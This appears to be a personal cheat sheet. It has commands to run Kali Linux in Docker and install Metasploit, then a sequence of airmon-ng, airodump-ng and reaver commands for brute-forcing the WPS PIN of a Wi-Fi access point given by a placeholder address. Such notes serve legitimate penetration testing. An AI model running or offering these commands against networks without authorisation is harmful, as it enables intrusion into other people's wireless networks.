# kali
https://www.kali.org/news/official-kali-linux-docker-images/

docker pull kalilinux/kali-rolling:latest
docker run -t -i --name kali kalilinux/kali-rolling /bin/bash
apt update && apt -y install metasploit-framework

# wifi
https://blog.csdn.net/qq_34489091/article/details/80229477

su
sudo *

ifconfig

airmon-ng start wlan0

airodump-ng wlan0mon

reaver -i wlan0mon -b xx:xx -vv

reaver -i wlan0mon -b xx:xx -p ping -vv
